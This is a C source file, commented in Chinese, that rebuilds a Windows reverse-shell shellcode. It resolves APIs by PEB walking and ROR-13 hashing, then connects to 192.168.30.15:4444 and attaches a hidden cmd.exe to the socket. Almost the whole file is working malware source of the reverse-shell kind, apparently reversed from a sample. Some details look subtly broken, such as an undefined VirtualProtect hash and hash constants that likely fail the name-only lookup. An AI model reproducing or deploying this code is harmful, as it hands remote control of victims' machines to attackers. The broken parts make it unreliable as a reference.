/*
 * payload_shellcode.c
 * ====================
 * 底层还原：与原始 .zsrp shellcode 等效的 C 代码
 *
 * 原始 shellcode 使用 PEB 遍历 + ROR-13 哈希查找动态解析 API，
 * 不依赖任何静态导入（除 VirtualProtect 外）。
 * 本文件以 C 代码实现完全相同的算法。
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdio.h>

/* ==============================================================
 * ROR-13 哈希 — 原始 shellcode 使用的哈希算法
 *
 * 原始汇编：
 *   ror edi, 0xD     ; 循环右移 13 位
 *   add edi, eax     ; 加上当前字符（大写）
 * ============================================================== */
static DWORD Ror13(DWORD hash, BYTE c)
{
    /* 将字符转为大写（原始代码使用 sub al, 0x20 当 al >= 'a'） */
    if (c >= 'a' && c <= 'z')
        c -= 0x20;

    /* ROR-13: 循环右移 13 位 */
    hash = (hash >> 13) | (hash << (32 - 13));
    hash += c;
    return hash;
}

/* ==============================================================
 * ComputeHash — 计算字符串的 ROR-13 哈希
 * ============================================================== */
static DWORD ComputeHash(LPCSTR str)
{
    DWORD hash = 0;
    while (*str)
    {
        hash = Ror13(hash, (BYTE)*str);
        str++;
    }
    return hash;
}

/* ==============================================================
 * API 哈希常量 — 从原始 shellcode 中提取
 * 这些是原始代码中的 push 立即数
 * ============================================================== */
#define HASH_LoadLibraryA   0x0726774C   /* 原始偏移 0xA1 */
#define HASH_WSAStartup     0x006B8029   /* 原始偏移 0xB3 */
#define HASH_WSASocketA     0xE0DF0FEA   /* 原始偏移 0xD0 */
#define HASH_connect        0x6174A599   /* 原始偏移 0xDC */
#define HASH_CreateProcessA 0x5FC8D902   /* 原始偏移 0xF7, 0x11D */
#define HASH_VirtualAlloc   0xE553A458   /* 原始偏移 0x10F */
#define HASH_ExitProcess    0x56A2B5F0   /* 原始偏移 0x158 (近似) */

/* ==============================================================
 * PEB 遍历 — 查找 kernel32.dll 基址
 *
 * 原始汇编（偏移 0x00-0x2D）：
 *   xor  edx, edx
 *   mov  edx, fs:[edx+0x30]  ; PEB
 *   mov  edx, [edx+0xC]      ; LDR
 *   mov  edx, [edx+0x14]     ; InMemoryOrderModuleList
 *   ...遍历链表计算 KERNEL32.DLL 的哈希...
 * ============================================================== */
static HMODULE GetKernel32Base(void)
{
    PPEB peb;
    PEB_LDR_DATA *ldr;
    LIST_ENTRY *entry;
    LDR_DATA_TABLE_ENTRY *module;
    DWORD targetHash = ComputeHash("KERNEL32.DLL");

    /* 通过 TEB 获取 PEB — 对应 fs:[0x30] */
#ifdef _WIN64
    peb = (PPEB)__readgsqword(0x60);
#else
    peb = (PPEB)__readfsdword(0x30);
#endif
    if (!peb) return NULL;

    ldr = peb->Ldr;
    if (!ldr) return NULL;

    /* 遍历 InMemoryOrderModuleList — 对应 [edx+0x14] */
    entry = ldr->InMemoryOrderModuleList.Flink;

    while (entry != &ldr->InMemoryOrderModuleList)
    {
        module = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (module->DllBase)
        {
            /* 计算模块名的 ROR-13 哈希 */
            WCHAR *wideName = module->BaseDllName.Buffer;
            DWORD hash = 0;
            if (wideName)
            {
                while (*wideName)
                {
                    WCHAR wc = *wideName;
                    /* WideChar 转 ASCII 并转大写 */
                    BYTE c = (BYTE)(wc & 0xFF);
                    if (c >= 'a' && c <= 'z') c -= 0x20;
                    hash = (hash >> 13) | (hash << (32 - 13));
                    hash += c;
                    wideName++;
                }
            }

            if (hash == targetHash)
                return (HMODULE)module->DllBase;
        }

        entry = entry->Flink;
    }

    return NULL;
}

/* ==============================================================
 * FindFunctionByHash — 在指定模块中通过哈希查找导出函数
 *
 * 原始汇编（偏移 0x33-0x89）：
 *   解析 PE 头 → 导出目录 → AddressOfNames/NameOrdinals/Functions
 *   对每个导出名称计算 ROR-13 哈希并与目标比较
 * ============================================================== */
static FARPROC FindFunctionByHash(HMODULE module, DWORD targetHash)
{
    PIMAGE_DOS_HEADER dos;
    PIMAGE_NT_HEADERS nt;
    IMAGE_DATA_DIRECTORY *expDir;
    IMAGE_EXPORT_DIRECTORY *exports;
    DWORD *names, *functions;
    WORD *ordinals;
    DWORD i;

    if (!module) return NULL;

    dos = (PIMAGE_DOS_HEADER)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    nt = (PIMAGE_NT_HEADERS)((BYTE*)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    expDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (expDir->Size == 0) return NULL;

    exports = (IMAGE_EXPORT_DIRECTORY*)((BYTE*)module + expDir->VirtualAddress);

    names     = (DWORD*)((BYTE*)module + exports->AddressOfNames);
    ordinals  = (WORD*) ((BYTE*)module + exports->AddressOfNameOrdinals);
    functions = (DWORD*)((BYTE*)module + exports->AddressOfFunctions);

    /*
     * 原始 shellcode 从后往前遍历：
     *   dec ecx
     *   mov esi, [ebx + ecx*4]  ; names[ecx]
     */
    for (i = 0; i < exports->NumberOfNames; i++)
    {
        LPCSTR name = (LPCSTR)((BYTE*)module + names[i]);
        DWORD hash = 0;

        /* 计算函数名的 ROR-13 哈希 */
        while (*name)
        {
            hash = Ror13(hash, (BYTE)*name);
            name++;
        }

        if (hash == targetHash)
        {
            /* 通过序号表获取函数地址 */
            WORD ordinal = ordinals[i];
            return (FARPROC)((BYTE*)module + functions[ordinal]);
        }
    }

    return NULL;
}

/* ==============================================================
 * 函数指针表 — 原始 shellcode 将所有解析的地址
 * 存储在栈上，并在回调后通过 jmp eax 调用
 * ============================================================== */
typedef struct _FN_TABLE {
    HMODULE hKernel32;
    FARPROC fnLoadLibraryA;
    FARPROC fnVirtualProtect;
    FARPROC fnVirtualAlloc;
    FARPROC fnCreateProcessA;
    FARPROC fnExitProcess;
    FARPROC fnWSAStartup;
    FARPROC fnWSASocketA;
    FARPROC fnConnect;
    HMODULE hWs2_32;
} FN_TABLE;

/* ==============================================================
 * shellcode_entry — 原始 .zsrp 节入口点的直接 C 翻译
 *
 * 对应原始汇编偏移 0x95：
 *   pop ebp          ; ebp = API 解析器
 *   push "32\0\0"
 *   push "ws2_"
 *   push esp         ; "ws2_32\0"
 *   push 0x0726774C  ; LoadLibraryA 的哈希
 *   call ebp
 * ============================================================== */
static FN_TABLE g_fn; /* 全局表，供内部函数使用 */

static void shellcode_api_resolver(DWORD targetHash)
{
    FARPROC fn = FindFunctionByHash(g_fn.hKernel32, targetHash);
    if (fn)
    {
        /*
         * 原始代码将地址存入栈上 [esp+0x24]，
         * 然后通过 popa/ret 恢复寄存器并 jmp eax。
         * 这里用它来设置全局表。
         */
        if (targetHash == HASH_LoadLibraryA)
            g_fn.fnLoadLibraryA = fn;
        else if (targetHash == HASH_VirtualProtect)
            g_fn.fnVirtualProtect = fn;
        else if (targetHash == HASH_VirtualAlloc)
            g_fn.fnVirtualAlloc = fn;
        else if (targetHash == HASH_CreateProcessA)
            g_fn.fnCreateProcessA = fn;
        else if (targetHash == HASH_ExitProcess)
            g_fn.fnExitProcess = fn;
        else if (targetHash == HASH_WSAStartup)
            g_fn.fnWSAStartup = fn;
        else if (targetHash == HASH_WSASocketA)
            g_fn.fnWSASocketA = fn;
        else if (targetHash == HASH_connect)
            g_fn.fnConnect = fn;
    }
}

/* 解析器适配器 — 对应原始 shellcode 中的 ebp 回调 */
static void WINAPI api_resolver_adapter(void)
{
    /* 该函数签名匹配原始 call ebp 的行为 */
}

/* ==============================================================
 * shellcode_main — 原始 .zsrp shellcode 的主逻辑
 * 对应原始偏移 0x95 - 结束
 * ============================================================== */
static void shellcode_main(void)
{
    WSADATA wsa;
    SOCKET sock;
    struct sockaddr_in addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    int port = 4444;

    /*
     * 1. 加载 ws2_32.dll
     *    原始：push "32\0\0" ; push "ws2_" ; push esp ; call resolver
     */
    g_fn.hWs2_32 = ((HMODULE(WINAPI*)(LPCSTR))g_fn.fnLoadLibraryA)("ws2_32.dll");
    if (!g_fn.hWs2_32) return;

    /*
     * 2. 从 ws2_32.dll 解析 Winsock 函数
     *    原始 shellcode 对每个函数使用相同的哈希查找机制
     */
    g_fn.fnWSAStartup   = FindFunctionByHash(g_fn.hWs2_32, HASH_WSAStartup);
    g_fn.fnWSASocketA   = FindFunctionByHash(g_fn.hWs2_32, HASH_WSASocketA);
    g_fn.fnConnect      = FindFunctionByHash(g_fn.hWs2_32, HASH_connect);

    if (!g_fn.fnWSAStartup || !g_fn.fnWSASocketA || !g_fn.fnConnect)
        return;

    /* 3. WSAStartup */
    if (((int(WSAAPI*)(WORD, LPWSADATA))g_fn.fnWSAStartup)(MAKEWORD(2,2), &wsa) != 0)
        return;

    /*
     * 4. 创建 Socket
     *    原始：push eax(x4) ; inc/push(x2) ; push WSASocketA hash ; call ebp
     *    WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0)
     */
    sock = ((SOCKET(WSAAPI*)(int, int, int, LPVOID, DWORD, DWORD))g_fn.fnWSASocketA)(
        AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) return;

    /*
     * 5. 构造地址并连接
     *    原始：push 10 ; push IP ; push AF_INET+port ; mov esi, esp
     *    connect(socket, sockaddr_in, 16)
     */
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(4444);
    addr.sin_addr.s_addr = inet_addr("192.168.30.15");

    /*
     * 原始重试循环：
     *   connect(...)
     *   test eax, eax
     *   jz  +10          ; 成功则跳过
     *   dec [esi+8]      ; 递减端口
     *   jnz -20          ; 重试
     */
retry:
    if (((int(WSAAPI*)(SOCKET, const struct sockaddr*, int))g_fn.fnConnect)(
            sock, (struct sockaddr*)&addr, sizeof(addr)) != 0)
    {
        if (port > 0)
        {
            port--;
            addr.sin_port = htons((WORD)port);
            goto retry;
        }
        closesocket(sock);
        return;
    }

    /*
     * 6. 创建 cmd.exe 进程，重定向 I/O
     *    原始：CreateProcessA(NULL, "cmd", ..., si, pi)
     *    对应原始偏移 0xF1-0x122
     */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput  = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError  = (HANDLE)sock;

    ZeroMemory(&pi, sizeof(pi));

    ((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
                    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
        g_fn.fnCreateProcessA)(
            NULL, "cmd", NULL, NULL,
            TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    /*
     * 7. 等待 shell 进程退出后清理
     *    原始 hProcess 的 WaitForSingleObject 在后续代码中
     */
    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(sock);
}

/* ==============================================================
 * main — 对应原始 PE 的入口点序列
 *
 * 原始 .text 存根：
 *   push ebp / mov ebp, esp / sub esp, 4
 *   VirtualProtect(.zsrp, 0x1000, PAGE_EXECUTE_READWRITE, &old)
 *   call .zsrp
 *
 * 原始 .zsrp 入口：
 *   cld / call +0x8f / pushad / ...PEB遍历...
 * ============================================================== */
int main(void)
{
    /*
     * 第一步：通过 PEB 遍历查找 kernel32.dll
     * 对应原始 shellcode 偏移 0x00-0x2D
     */
    g_fn.hKernel32 = GetKernel32Base();
    if (!g_fn.hKernel32) return 1;

    /*
     * 第二步：通过哈希查找解析 LoadLibraryA
     * 原始 shellcode 的 API 解析器在偏移 0x33-0x89
     */
    g_fn.fnLoadLibraryA = FindFunctionByHash(g_fn.hKernel32, HASH_LoadLibraryA);
    g_fn.fnCreateProcessA = FindFunctionByHash(g_fn.hKernel32, HASH_CreateProcessA);
    g_fn.fnVirtualAlloc = FindFunctionByHash(g_fn.hKernel32, HASH_VirtualAlloc);
    g_fn.fnExitProcess  = FindFunctionByHash(g_fn.hKernel32, HASH_ExitProcess);

    if (!g_fn.fnLoadLibraryA) return 1;

    /*
     * 第三步：执行 shellcode 主体
     */
    shellcode_main();

    /* 退出 — 对应原始代码中的 ExitProcess */
    ((void(WINAPI*)(UINT))g_fn.fnExitProcess)(0);
    return 0;
}
